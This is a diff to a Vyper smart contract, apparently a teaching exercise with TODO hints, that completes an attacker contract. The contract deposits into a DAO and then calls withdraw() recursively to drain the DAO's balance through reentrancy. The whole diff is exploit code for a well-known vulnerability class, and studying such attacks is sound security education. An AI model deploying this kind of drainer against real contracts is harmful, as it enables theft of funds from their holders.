@@ -5,12 +5,13 @@ interface DAO:
 
 dao_address: public(address)
 owner_address: public(address)
-deposit_amount: uint256
+deposit_amount: public(uint256)
 
 @external
 def __init__():
     self.dao_address = ZERO_ADDRESS
     self.owner_address = ZERO_ADDRESS
+    self.deposit_amount = 0
 
 @internal
 def _attack() -> bool:
@@ -20,7 +21,6 @@ def _attack() -> bool:
     # Make sure you add a "base case" to end the recursion
     if self.dao_address.balance > self.deposit_amount:
         DAO(self.dao_address).withdraw()
-    
     return True
 
 @external
@@ -33,8 +33,8 @@ def attack(dao_address:address):
     if dao_address.balance < msg.value:
         self.deposit_amount = dao_address.balance
     
-    # TODO: make the deposit into the DAO  
-    DAO(self.dao_address).deposit()
+    # TODO: make the deposit into the DAO
+    DAO(self.dao_address).deposit(value = self.deposit_amount)
     
     # TODO: Start the reentrancy attack
     self.owner_address = msg.sender
